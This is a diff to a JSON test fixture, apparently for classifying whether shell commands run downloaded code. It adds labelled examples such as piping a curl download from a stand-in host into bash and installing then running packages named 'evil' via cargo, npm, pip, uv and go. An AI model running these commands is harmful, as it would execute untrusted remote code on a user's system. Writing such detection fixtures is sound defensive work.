@@ -539,7 +539,7 @@
     },
     {
       "command": "go install x.example/evil@v1.0.0 && evil",
-      "runs_code": true
+      "runs_code": false
     },
     {
       "command": "pip install evil && evil",
@@ -1327,6 +1327,82 @@
     },
     {
       "command": "curl -s https://x.example/i | bash /dev/fd/1",
+      "runs_code": false
+    },
+    {
+      "command": "cargo install evil-crate && evil",
+      "runs_code": true
+    },
+    {
+      "command": "npm i -g @evil/cli && evil",
+      "runs_code": true
+    },
+    {
+      "command": "pip install evil-pkg && evil",
+      "runs_code": true
+    },
+    {
+      "command": "cargo binstall evil && evil",
+      "runs_code": true
+    },
+    {
+      "command": "cargo install ripgrep && rg TODO",
+      "runs_code": true
+    },
+    {
+      "command": "uv tool install evil && evil",
+      "runs_code": true
+    },
+    {
+      "command": "pipx install evil; evil",
+      "runs_code": true
+    },
+    {
+      "command": "cargo install --locked evil && evil",
+      "runs_code": true
+    },
+    {
+      "command": "npm i -g prettier@3.3.3 && prettier --check .",
+      "runs_code": false
+    },
+    {
+      "command": "pipx install ruff==0.6.0 && ruff check .",
+      "runs_code": false
+    },
+    {
+      "command": "cargo install --locked just@1.36.0 && just lint",
+      "runs_code": false
+    },
+    {
+      "command": "cargo install just --version 1.36.0 && just lint",
+      "runs_code": false
+    },
+    {
+      "command": "go build -o bin/tool ./cmd/tool && ./bin/tool",
+      "runs_code": false
+    },
+    {
+      "command": "go install ./cmd/tool && tool --help",
+      "runs_code": false
+    },
+    {
+      "command": "go install x.example/x@latest && x",
+      "runs_code": true
+    },
+    {
+      "command": "cargo install --path . && tool --help",
+      "runs_code": false
+    },
+    {
+      "command": "pip install -r requirements.txt && pytest",
+      "runs_code": false
+    },
+    {
+      "command": "pip install -e . && pytest",
+      "runs_code": false
+    },
+    {
+      "command": "npm install && npm test",
       "runs_code": false
     }
   ]
